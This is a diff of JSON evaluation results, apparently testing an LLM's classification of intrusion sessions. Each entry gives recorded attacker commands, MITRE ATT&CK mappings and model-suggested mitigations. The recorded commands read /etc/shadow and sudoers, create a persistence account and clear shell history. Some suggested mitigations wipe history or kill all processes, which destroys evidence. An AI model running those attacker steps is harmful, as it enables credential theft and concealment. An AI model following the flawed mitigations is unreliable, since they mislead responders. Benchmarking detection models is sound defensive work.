+          "technique_name": "Indicator Removal on Host: Clear Command History",
           "evidence": "history -c"
         }
       ],
       "mitigation_commands": [
-        "history -c",
-        "passwd -l root",
-        "kill -9 -1",
-        "iptables -A INPUT -s 198.51.100.81 -j DROP",
-        "auditctl -w /etc/group -p wa -k group_mod"
+        "history -c && exit",
+        "passwd root",
+        "lastlog",
+        "ss -tulnp",
+        "ausearch -m USER_AUTH,ADD_USER,DEL_USER -i"
       ],
       "session_id": "hum_08_d73f5021a804",
       "src_ip": "198.51.100.81",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.68,
+      "tempo_segundos": 1.74,
+      "comandos": [
+        "pwd",
+        "ls -la /home",
+        "cat /etc/group",
+        "ss -tulnp",
+        "find /etc -writable 2>/dev/null",
+        "history -c"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "Sessão interativa demonstrando reconhecimento manual pós-exploração, verificação de diretórios, grupos, conexões de rede ativas, busca por arquivos graváveis em /etc e tentativa de limpeza do histórico de comandos.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /home"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1069",
+          "technique_name": "Permission Groups Discovery",
+          "evidence": "cat /etc/group"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1049",
+          "technique_name": "System Network Connections Discovery",
+          "evidence": "ss -tulnp"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "history -c && exit",
+        "pkill -u root",
+        "iptables -A INPUT -s 198.51.100.81 -j DROP"
+      ],
+      "session_id": "hum_08_d73f5021a804",
+      "src_ip": "198.51.100.81",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.54,
       "comandos": [
         "pwd",
         "ls -la /home",
@@ -1159,13 +2651,60 @@
   {
     "ordem": 29,
     "session_id": "hum_09_e54a9017b329",
+    "pausas_segundos": [
+      14,
+      38
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /etc/shadow (+14s)",
+      "[2] history -c (+38s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /etc/shadow",
+      "[2] history -c"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.4,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 2.21,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "CRÍTICO",
-      "summary": "O invasor realizou a leitura direta do arquivo de hashes de senhas (/etc/shadow) e em seguida limpou o histórico do shell para ocultar seus rastros.",
+      "summary": "O invasor realizou uma tentativa de leitura direta do arquivo de hashes de senhas (/etc/shadow) e imediatamente limpou o histórico de comandos para ocultar seus rastros (history -c).",
+      "mitre_attack": [
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.008",
+          "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+          "evidence": "cat /etc/shadow"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "chattr +i /etc/shadow",
+        "history -c && history -w",
+        "pkill -u root -t pts/0"
+      ],
+      "session_id": "hum_09_e54a9017b329",
+      "src_ip": "198.51.100.82",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 2.21,
+      "comandos": [
+        "cat /etc/shadow",
+        "history -c"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor acessou o arquivo de hashes de senhas (/etc/shadow) para roubo de credenciais e limpou o histórico do shell para apagar os rastros da atividade maliciosa, indicando comportamento tático manual.",
       "mitre_attack": [
         {
           "tactic": "Credential Access",
@@ -1181,15 +2720,15 @@
         }
       ],
       "mitigation_commands": [
-        "passwd root",
-        "passwd -e root",
-        "history -c && history -w",
-        "cat /var/log/auth.log"
+        "passwd -l root",
+        "kill -9 -u root",
+        "history -c",
+        "echo '' > ~/.bash_history"
       ],
       "session_id": "hum_09_e54a9017b329",
       "src_ip": "198.51.100.82",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.4,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.35,
       "comandos": [
         "cat /etc/shadow",
         "history -c"
@@ -1199,13 +2738,39 @@
   {
     "ordem": 30,
     "session_id": "hum_10_f18b6093c410",
+    "pausas_segundos": [
+      4,
+      5,
+      6,
+      7,
+      10,
+      5
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+4s)",
+      "[2] uname -r (+5s)",
+      "[3] ls -la /root (+6s)",
+      "[4] cat /etc/sudoers (+7s)",
+      "[5] useradd -m -s /bin/bash suporte (+10s)",
+      "[6] history -c && exit (+5s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] uname -r",
+      "[3] ls -la /root",
+      "[4] cat /etc/sudoers",
+      "[5] useradd -m -s /bin/bash suporte",
+      "[6] history -c && exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.49,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 1.99,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "CRÍTICO",
-      "summary": "O invasor realizou reconhecimento manual pós-exploração, verificando privilégios, versão do kernel e arquivos sensíveis, seguido pela criação de uma nova conta de usuário para persistência e limpeza do histórico.",
+      "summary": "O invasor realizou reconhecimento manual do sistema, verificou privilégios, examinou configurações sensíveis de sudoers, criou uma nova conta de usuário para persistência e limpou o histórico de comandos.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -1235,14 +2800,64 @@
       "mitigation_commands": [
         "userdel -r suporte",
         "passwd -l root",
-        "sed -i '/suporte/d' /etc/passwd",
-        "rm -rf /root/.bash_history",
-        "lastlog"
+        "sed -i '/suporte/d' /etc/sudoers",
+        "lastlog",
+        "ss -tulpn"
       ],
       "session_id": "hum_10_f18b6093c410",
       "src_ip": "198.51.100.83",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.49,
+      "tempo_segundos": 1.99,
+      "comandos": [
+        "id",
+        "uname -r",
+        "ls -la /root",
+        "cat /etc/sudoers",
+        "useradd -m -s /bin/bash suporte",
+        "history -c && exit"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor obteve acesso root, conduziu reconhecimento manual do sistema operacional e arquivos de privilégios, criou uma nova conta de usuário para persistência e limpou o histórico de comandos para encobrir os rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1136.001",
+          "technique_name": "Create Account: Local Account",
+          "evidence": "useradd -m -s /bin/bash suporte"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c && exit"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -r"
+        }
+      ],
+      "mitigation_commands": [
+        "userdel -r suporte",
+        "passwd -l root",
+        "pkill -u root -t pts/*",
+        "last -a",
+        "auditctl -w /etc/sudoers -p wa -k sudoers_changes"
+      ],
+      "session_id": "hum_10_f18b6093c410",
+      "src_ip": "198.51.100.83",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.62,
       "comandos": [
         "id",
         "uname -r",
